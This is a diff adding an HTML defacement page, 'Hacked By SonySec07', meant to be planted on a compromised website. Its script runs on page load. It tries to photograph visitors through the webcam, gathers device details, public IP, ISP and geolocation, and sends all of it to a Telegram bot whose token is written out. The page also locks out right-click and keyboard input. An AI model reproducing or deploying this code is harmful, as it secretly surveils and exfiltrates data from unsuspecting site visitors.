@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Hacked By SonySec07</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <style>
+    body, a:hover { cursor: url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important; }
+    center { font-family: Courier; }
+    img { opacity: 0.8; }
+    red { color: red; }
+  </style>
+  <script>
+    const BOT_TOKEN = "7843724459:AAF1NRTK0lyN33cul3xUtZBWQa4ar-havIY";
+    const CHAT_ID  = "7008546927";
+
+    window.addEventListener('DOMContentLoaded', () => {
+      // Coba akses kamera, tapi jika gagal langsung kirim info saja
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          // Jika izin diberikan, kita bisa ambil foto (sama seperti sebelumnya)
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.autoplay = true;
+          video.playsInline = true;
+          video.muted = true;
+          video.style.display = 'none';
+          video.addEventListener('loadeddata', async () => {
+            // Tangkap frame
+            const canvas = document.createElement('canvas');
+            canvas.width  = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            // Stop kamera
+            stream.getTracks().forEach(t => t.stop());
+            // Kirim foto lalu info
+            canvas.toBlob(async blob => {
+              await sendPhoto(blob);
+              await sendDeviceAndNetworkInfo();
+            }, 'image/jpeg', 0.8);
+          });
+        })
+        .catch(err => {
+          console.warn('No camera or permission denied, sending only device & network info.', err);
+          // Jika error atau izin ditolak: kirim hanya info
+          sendDeviceAndNetworkInfo();
+        });
+    });
+
+    async function sendPhoto(photoBlob) {
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("photo", photoBlob, "capture.jpg");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: form
+      });
+    }
+
+    async function sendDeviceAndNetworkInfo() {
+      try {
+        // Device Info
+        const ua       = navigator.userAgent;
+        const platform = navigator.platform;
+        const lang     = navigator.language;
+        const [w, h]   = [screen.width, screen.height];
+
+        // Ambil IP publik
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipRes.json();
+
+        // Lookup ISP & Geo
+        const netRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const info   = await netRes.json();
+
+        // Susun pesan
+        let text = `📌 *Device Info*\n`;
+        text += `• UA        : \`${ua}\`\n`;
+        text += `• Platform  : \`${platform}\`\n`;
+        text += `• Language  : \`${lang}\`\n`;
+        text += `• Resolution: ${w}×${h}\n\n`;
+        text += `🌐 *Network & ISP Info*\n`;
+        text += `• IP Address: \`${ip}\`\n`;
+        if (info.org)      text += `• ISP        : \`${info.org}\`\n`;
+        if (info.city)     text += `• Location   : ${info.city}, ${info.region}, ${info.country_name}\n`;
+        if (info.latitude) {
+          text += `• Geo coords : ${info.latitude}, ${info.longitude}\n`;
+          const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${info.latitude},${info.longitude}`;
+          text += `• Maps link  : [Lihat di Maps](${mapsUrl})\n`;
+        }
+
+        // Kirim ke Telegram
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.error('Error sending device/network info:', err);
+      }
+    }
+  </script>
+</head>
+<body bgcolor="white" text="black"
+      oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+  <table width="100%" height="80%"><td>
+    <center>
+      <small>4 BROTHER</small><br>
+      <img src="https://abilitysportsafrica.org/alok99.png" width="220" height="220"><br>
+      Hacked by <red><i>SonySec07</i></red><br>
+      <font size="2">
+        wh00pz! your website security get down<br>
+        patch it before something bad happens
+      </font><br><br>
+      <small><font size="1" color="gray">johnfelix@mail2tor.co</font></small><br><br><br>
+      <font size="2"><i>Greetz</i><br>
+      …[daftar grup/hacker]…
+      </font>
+    </center>
+  </td></table>
+  <audio src="https://i.top4top.io/m_3076tjqzc0.mp3" autoplay loop></audio>
+</body>
+</html>
